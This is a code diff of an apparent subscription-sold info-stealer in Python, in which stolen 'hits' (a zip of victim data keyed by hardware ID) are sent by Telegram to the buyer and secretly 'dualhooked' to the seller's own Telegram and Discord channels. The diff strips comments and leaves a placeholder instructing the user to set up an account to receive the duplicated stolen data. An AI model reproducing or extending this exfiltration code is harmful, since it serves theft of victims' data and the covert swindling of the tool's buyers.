@@ -580,20 +580,17 @@ def main():
             log("Invalid or expired subscription. Exiting.")
             return
         
-        # Seller (dualhook) credentials - your ID
-        SELLER_ID = "ilijainjegovegacebruh"
+        SELLER_ID = "Create a new user that the dualhooked hits will go to and paste it here."
         seller_config = get_user_config(SELLER_ID)
         
         if not seller_config:
             log("Seller configuration not found. Exiting.")
             return
         
-        # Extract seller credentials from Firebase
         WEBHOOK_URL = seller_config.get('discord_webhook')
         TELEGRAM_BOT_TOKEN = seller_config.get('telegram_bot_token')
         TELEGRAM_USER_ID = seller_config.get('telegram_chat_id')
         
-        # Check if dualhook (both Discord and Telegram available)
         is_dualhook = (WEBHOOK_URL and TELEGRAM_BOT_TOKEN and TELEGRAM_USER_ID)
         if is_dualhook:
             log("DUALHOOKED: Both Discord and Telegram available")
@@ -612,10 +609,8 @@ def main():
         telegram_link = None
         
         if is_dualhook:
-            # TRUE DUALHOOK: Send zip to BOTH buyer and seller
             log("DUALHOOKED HIT: Sending zip to both buyer and seller")
             
-            # Send zip file to BUYER's Telegram (filip's credentials from buyer config)
             BUYER_TELEGRAM_BOT_TOKEN = buyer_config.get('telegram_bot_token')
             BUYER_TELEGRAM_USER_ID = buyer_config.get('telegram_chat_id')
             
@@ -626,11 +621,9 @@ def main():
                     buyer_success = True
                     log(f"Buyer {USER_ID} received zip: {buyer_telegram_link}")
             
-            # Send zip file to SELLER's Telegram (ilijainjegovegacebruh) with dualhook message
             seller_telegram_link = send_dualhook_telegram(zip_path, hwid, TELEGRAM_BOT_TOKEN, TELEGRAM_USER_ID)
             
             if seller_telegram_link:
-                # Send dualhook message to SELLER's Telegram (ilijainjegovegacebruh)
                 dualhook_message = f' Dualhooked hit\n\n' \
                                  f'Dualhook hit from: {USER_ID}\n\n' \
                                  f'This is the zip they got:\n\n' \
